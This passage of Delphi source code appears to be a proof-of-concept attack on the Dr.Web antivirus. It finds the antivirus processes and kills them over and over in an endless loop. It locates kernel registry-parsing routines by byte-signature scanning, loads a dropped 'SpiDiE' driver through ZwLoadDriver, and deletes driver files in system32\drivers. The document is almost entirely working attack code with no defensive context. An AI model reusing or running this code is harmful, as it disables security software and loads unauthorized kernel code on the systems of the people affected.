    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00
    );

  cm2600_7600: array[0..6] of BYTE = ($C7, $45, $B4, $3F, $00, $0F, $00); //C7 45 B4 3F 00 0F 00

type
  _SYSINFOBUF = record
    uHandleCount: ULONG;
    rHandleTable: array[0..0] of SYSTEM_HANDLE_INFORMATION;
  end;
  SYSINFOBUF = _SYSINFOBUF;
  PSYSINFOBUF = ^_SYSINFOBUF;

  _SYSINFO_BUFFER = record
    Count: ULONG;
    ModInfo: array[0..0] of SYSTEM_MODULE_INFORMATION;
  end;
  SYSINFO_BUFFER = _SYSINFO_BUFFER;
  PSYSINFO_BUFFER = ^_SYSINFO_BUFFER;

var
  preloaded_kernel: PVOID;
  KernelBaseAddress: DWORD;

  DrWebID: array[0..DrWebProcessesMax] of DWORD;
  ProcessHandles: array[0..29] of THANDLE;

  buf1: LBuf;

  ProcessHandlesCount: integer = 0;
  pBuffer: PROCESSENTRY32W;
  SnapShotHandle: THANDLE;

  modinf: SYSINFO_BUFFER;
  bytesIO: ULONG;
  dos_header: ^IMAGE_DOS_HEADER;
  pe_headers: PPE_HEADER_BLOCK;

  EventHandle: THANDLE;
  attr: OBJECT_ATTRIBUTES;
  str1: UNICODE_STRING;

  CmKeyType: OBJECT_TYPE_INITIALIZER;

procedure GetCmKeyObjectInitializer(pObjectBody: POBJECT_TYPE_INITIALIZER; const KernelBaseAddress: DWORD); stdcall;
var
  RawSize, x, y: DWORD;
  RawData, p1: PChar;
  i, Length: integer;
  u: integer;
  bFound: boolean;

  function CheckSignature(var signsize: dword): BOOLEAN;
  var
    c: integer;
  begin
    result := true;
    signsize := 7;
    for c := 0 to 6 do
      if (cm2600_7600[c] <> PBYTE(RawData + c)^) then
      begin
        result := false;
        break;
      end;
  end;

begin
  p1 := preloaded_kernel;
  dos_header := pointer(p1);
  pe_headers := pointer(p1 + dos_header^._lfanew);

  bFound := false;
  for u := 0 to pe_headers^.FileHeader.NumberOfSections - 1 do
  begin
    if bFound then break;
    RawData := pointer(p1 + pe_headers^.Sections[u].PointerToRawData);
    RawSize := pe_headers^.Sections[u].SizeOfRawData - 12;
    x := 0;
    while (RawSize > 512) do
    begin
      if CheckSignature(x) then
      begin
        inc(RawData, x);
        dec(RawSize, x);
        Length := SizeOfProc(Pointer(RawData));

        for i := 0 to Length do
        begin
          if (PBYTE(RawData + i)^ = $C7)
            and (PBYTE(RawData + i + 1)^ = $45)
            and (PBYTE(RawData + i + 2)^ = $D0) then
          //mov [ebp+var_30],
          begin
            y := 3;
            x := PULONG(RawData + i + y)^;

            x := x - KernelBaseAddress;
            pObjectBody^.CloseProcedure := pointer(KernelBaseAddress + x); //CmpCloseKeyObject

            x := SizeOfCode(Pointer(RawData + i), nil);
            if (x = 0) then inc(x);
            inc(y, x);
            x := PULONG(RawData + i + y)^;
            x := x - KernelBaseAddress;
            pObjectBody^.DeleteProcedure := pointer(KernelBaseAddress + x); //CmpDeleteKeyObject

            x := SizeOfCode(Pointer(RawData + i), nil);
            if (x = 0) then inc(x);
            inc(y, x);
            x := PULONG(RawData + i + y)^;
            x := x - KernelBaseAddress;
            pObjectBody^.ParseProcedure := pointer(KernelBaseAddress + x); //CmpParseKey

            bFound := true;
            break;
          end;
        end;
        if bFound then break;
      end;
      inc(RawData);
      dec(RawSize);
    end;
  end;
end;

procedure GetOriginalSystemState(); stdcall;
begin
  bytesIO := 0;
  ZwQuerySystemInformation(SystemModuleInformation, @modinf, sizeof(SYSINFO_BUFFER), @bytesIO);
  if (bytesIO = 0) then exit;
  strcpyW(buf1, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(buf1, '\system32\');
  RtlAnsiToUnicode(strendW(buf1), @modinf.ModInfo[0].ImageName[modinf.ModInfo[0].ModuleNameOffset]);

  preloaded_kernel := PELdrLoadLibrary(buf1, nil, modinf.ModInfo[0].Base);
  if (preloaded_kernel <> nil) then
  begin
    dos_header := pointer(preloaded_kernel);
    pe_headers := pointer(PCHAR(preloaded_kernel) + dos_header^._lfanew);
    KernelBaseAddress := (DWORD(modinf.ModInfo[0].Base) - pe_headers^.OptionalHeader.ImageBase);
    GetCmKeyObjectInitializer(@CmKeyType, KernelBaseAddress);
  end;
end;

function FillProcessesArray(): boolean;
var
  h2: THANDLE;
  bytesIO: ULONG;
  buf: PSYSINFOBUF;
  last, i, c: integer;
  pbi: PROCESS_BASIC_INFORMATION;
begin
  ProcessHandlesCount := 0;
  memzero(@DrWebID, sizeof(DrWebID));
  memzero(@ProcessHandles, sizeof(ProcessHandles));

  last := 0;
  pBuffer.dwSize := sizeof(PROCESSENTRY32W);
  SnapShotHandle := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if (SnapShotHandle <> INVALID_HANDLE_VALUE) then
  begin
    if Process32FirstW(SnapShotHandle, @pBuffer) then
      repeat

        if (last = DrWebProcessesMax) then break;
        for i := 0 to DrWebProcessesMax do
        begin
          if (strcmpiW(pBuffer.szExeFile, DrWebProcesses[i]) = 0) then
          begin
            DrWebID[last] := pBuffer.th32ProcessID;
            inc(last);
          end;
        end;

      until (not Process32NextW(SnapShotHandle, @pBuffer));
    CloseHandle(SnapShotHandle);
  end;

  bytesIO := 4194304;
  buf := nil;
  ZwAllocateVirtualMemory(DWORD(-1), @buf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  if (buf <> nil) then
  begin

    ZwQuerySystemInformation(SystemHandleInformation, buf, 4194304, @bytesIO);
    for c := 0 to Integer(buf^.uHandleCount) - 1 do
      if (buf^.rHandleTable[c].ProcessId = NtGetCurrentProcessId()) then
      begin
        if (buf^.rHandleTable[c].ObjectTypeNumber = 5) then //Process Type Object ID
        begin

          h2 := buf^.rHandleTable[c].Handle;
          if (ZwQueryInformationProcess(h2, ProcessBasicInformation, @pbi, sizeof(pbi), @bytesIO) = STATUS_SUCCESS) then
          begin
            for i := 0 to DrWebProcessesMax do
            begin
              if (pbi.UniqueProcessId = DrWebID[i]) then
              begin
                ProcessHandles[ProcessHandlesCount] := h2;
                inc(ProcessHandlesCount);
              end;
            end;
          end;

        end;
      end;
    bytesIO := 0;
    ZwFreeVirtualMemory(NtCurrentProcess, @buf, @bytesIO, MEM_RELEASE);
  end;
  result := (ProcessHandlesCount > 0);
end;

procedure KillProcesses();
var
  i: integer;
begin
  for i := 0 to ProcessHandlesCount - 1 do
  begin
    ZwTerminateProcess(ProcessHandles[i], 0);
    ZwClose(ProcessHandles[i]);
  end;
end;

function WriteDriverLoadSettings(
  RegPath: PWideChar
  ): boolean; stdcall;
var
  drvkey: THANDLE;
  dat1: DWORD;
begin
  result := false;
  RtlInitUnicodeString(@str1, RegPath);
  attr.Length := sizeof(OBJECT_ATTRIBUTES);
  attr.RootDirectory := 0;
  attr.ObjectName := @str1;
  attr.Attributes := OBJ_CASE_INSENSITIVE;
  attr.SecurityDescriptor := nil;
  attr.SecurityQualityOfService := nil;
  if (ZwCreateKey(@drvkey, KEY_ALL_ACCESS, @attr, 0,
    nil, REG_OPTION_NON_VOLATILE, nil) <> STATUS_SUCCESS) then exit;

  dat1 := SERVICE_ERROR_NORMAL;
  RtlInitUnicodeString(@str1, 'ErrorControl');
  ZwSetValueKey(drvkey, @str1, 0, REG_DWORD, @dat1, sizeof(DWORD));

  dat1 := SERVICE_DEMAND_START;
  RtlInitUnicodeString(@str1, 'Start');
  ZwSetValueKey(drvkey, @str1, 0, REG_DWORD, @dat1, sizeof(DWORD));

  dat1 := SERVICE_KERNEL_DRIVER;
  RtlInitUnicodeString(@str1, 'Type');
  ZwSetValueKey(drvkey, @str1, 0, REG_DWORD, @dat1, sizeof(DWORD));

  dat1 := ULONG(CmKeyType.ParseProcedure);
  RtlInitUnicodeString(@str1, 'Parse');
  ZwSetValueKey(drvkey, @str1, 0, REG_DWORD, @dat1, sizeof(DWORD));

  ZwClose(drvkey);

  result := true;
end;

function SpiDiE_LoadDriver(
  const RegistryPath: PWideChar
  ): BOOL; stdcall;
var
  s1: UNICODE_STRING;
  disp: DWORD;
begin
  result := false;
  if not WriteDriverLoadSettings(RegistryPath) then exit;
  RtlInitUnicodeString(@s1, RegistryPath);
  disp := ZwLoadDriver(@s1);
  result := (disp = STATUS_TOO_LATE);
end;

procedure SpiDiE_2();
var
  i: integer;
begin
  memzero(@buf1, sizeof(LBuf));
  strcpyW(buf1, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(buf1, spidiedriver);
  if (Internal_WriteBufferToFile(buf1, @data, sizeof(data)) = sizeof(data)) then
  begin
    GetOriginalSystemState();

    if (SpiDiE_LoadDriver(RegPath)) then
    begin
      Internal_RemoveFile(buf1);

      for i := 0 to 3 do
      begin
        strcpyW(buf1, KI_SHARED_USER_DATA.NtSystemRoot);
        strcatW(buf1, '\system32\drivers\');
        strcatW(buf1, drivers[i]);
        Internal_RemoveFile(buf1);
      end;
    end
    else
    begin
      strcpyW(buf1, KI_SHARED_USER_DATA.NtSystemRoot);
      strcatW(buf1, spidiedriver);
      Internal_RemoveFile(buf1);
      NtSleep(2000);
    end;
  end;
end;

procedure main();
begin
  EventHandle := 0;
  RtlInitUnicodeString(@str1, String5);
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwOpenEvent(@EventHandle, EVENT_ALL_ACCESS, @attr) = STATUS_SUCCESS) then
  begin
    if (FillProcessesArray()) then
    begin
      KillProcesses();
      if (Internal_AdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE) = STATUS_SUCCESS) then
        SpiDiE_2();
      ZwSetEvent(EventHandle, nil);
      ZwClose(EventHandle);
      Internal_RegDeleteKeyRecursive(0, RegPath);

      while (true) do
      begin
        NtSleep(1000);
        if (FillProcessesArray()) then
        begin
          KillProcesses();
          OutputDebugStringW(String7);
        end;
      end;
    end;
  end;
end;

asm
  call main
  xor eax, eax
  inc eax
  retn $000c
end.

